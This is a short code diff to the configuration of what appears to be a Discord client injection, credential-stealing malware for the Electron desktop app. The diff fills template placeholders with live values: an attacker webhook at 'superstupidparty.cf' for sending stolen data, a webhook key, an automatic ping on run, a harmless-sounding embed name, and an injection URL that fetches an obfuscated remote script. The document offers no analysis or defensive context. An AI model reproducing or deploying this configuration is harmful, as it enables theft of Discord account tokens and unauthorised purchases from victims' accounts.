@@ -6,15 +6,15 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
+  webhook: 'https://superstupidparty.cf/', 
+  webhook_protector_key: 'DHBIIPWCSDBYRQ5EYKD4HOGDRINQ====', 
   auto_buy_nitro: true, 
-  ping_on_run: false, 
-  ping_val: '@everyone', 
-  embed_name: 'puluxynin pizzası', 
+  ping_on_run: true, 
+  ping_val: '<@&981607896833982485>', 
+  embed_name: 'pizza service', 
   embed_icon: 'https://cdn.discordapp.com/attachments/975147414140911680/978309699466330192/download.jpg'.replace(/ /g, '%20'),
   embed_color: 0x36393E, 
-  injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/mrhnpjs/nw-indx.js/main/obf-inj.js', 
  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
